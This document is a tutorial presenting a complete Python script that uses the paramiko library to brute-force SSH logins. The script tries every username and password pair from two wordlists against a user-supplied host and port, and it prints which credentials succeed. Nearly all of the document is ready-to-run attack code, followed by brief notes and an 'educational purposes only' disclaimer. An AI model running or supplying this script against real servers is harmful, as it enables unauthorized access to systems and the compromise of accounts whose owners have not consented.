### Brute Force SSH Script with Paramiko

This Python script performs a brute-force attack on an SSH server using the `paramiko` library. It attempts to authenticate using a list of usernames and passwords obtained from separate files.

### 1. Importing Required Modules:

```python
import paramiko
import socket
import time
```

### 2. Brute Force SSH Function:

```python
def brute_force_ssh(hostname, port, user, password):
    # Log to a file for debugging purposes
    log = paramiko.util.log_to_file('log.log')

    # Create an SSH client object
    ssh_client = paramiko.SSHClient()

    # Load system host keys
    ssh_client.load_system_host_keys()

    # Automatically add unknown hosts to the list of known hosts
    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        # Attempt SSH connection with the provided credentials
        print('Testing credentials {}:{}'.format(user, password))
        ssh_client.connect(hostname, port=port, username=user, password=password, timeout=5)
        print('Credentials OK {}:{}'.format(user, password))
    except paramiko.AuthenticationException as exception:
        print('AuthenticationException:', exception)
    except socket.error as error:
        print('SocketError:', error)
    finally:
        # Close the SSH client connection
        ssh_client.close()
```

### 3. Main Function:

```python
def main():
    # Get user input for the target hostname and port
    hostname = input("Enter the target hostname: ")
    port = input("Enter the target port: ")

    # Read usernames from a file
    users = open('users.txt', 'r').readlines()

    # Read passwords from a file
    passwords = open('passwords.txt', 'r').readlines()

    # Iterate over each combination of username and password
    for user in users:
        for password in passwords:
            # Introduce a delay to slow down the brute-force attempts
            time.sleep(3)

            # Perform a brute-force attempt using the current username and password
            brute_force_ssh(hostname, port, user.rstrip(), password.rstrip())


if __name__ == '__main__':
    main()
```

### Notes:

- The script prompts the user for the target hostname and port.
- Usernames and passwords are read from separate files (`users.txt` and `passwords.txt`).
- There is a deliberate delay (`time.sleep(3)`) between each attempt to slow down the brute-force process.
- The script uses the `paramiko` library for SSH communication and handles authentication exceptions and socket errors.
- This script is for educational purposes only. Unauthorized access attempts are illegal and unethical. Always ensure you have the appropriate permissions before testing or running such scripts.
